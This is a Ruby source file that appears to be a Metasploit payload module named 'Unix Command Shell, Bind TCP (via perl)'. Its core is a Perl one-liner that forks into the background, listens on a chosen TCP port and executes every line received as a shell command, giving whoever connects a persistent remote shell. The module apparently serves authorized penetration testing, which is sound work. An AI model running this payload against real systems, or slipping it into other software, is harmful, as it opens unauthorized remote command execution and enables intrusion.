require 'msf/core'
require 'msf/core/handler/bind_tcp'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Cmd
module Unix

module BindPerl

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Unix Command Shell, Bind TCP (via perl)',
			'Version'       => '$Revision$',
			'Description'   => 'Listen for a connection and spawn a command shell (persistant)',
			'Author'        => ['Samy <samy@samy.pl>', 'cazz'],
			'License'       => MSF_LICENSE,
			'Platform'      => 'unix',
			'Arch'          => ARCH_CMD,
			'Handler'       => Msf::Handler::BindTcp,
			'Session'       => Msf::Sessions::CommandShell,
			'PayloadType'   => 'cmd',
			'Payload'       =>
				{
					'Offsets' => { },
					'Payload' => ''
				}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		return super + command_string
	end
	
	#
	# Returns the command string to use for execution
	#
	def command_string

		cmd = "perl -MIO -e '$p=fork();exit,if$p;while($c=new IO::Socket::INET(LocalPort,#{datastore['LPORT']},Reuse,1,Listen)->accept){$~->fdopen($c,w);STDIN->fdopen($c,r);system$_ while<>}'"

		return cmd
	end

end

end end end end end
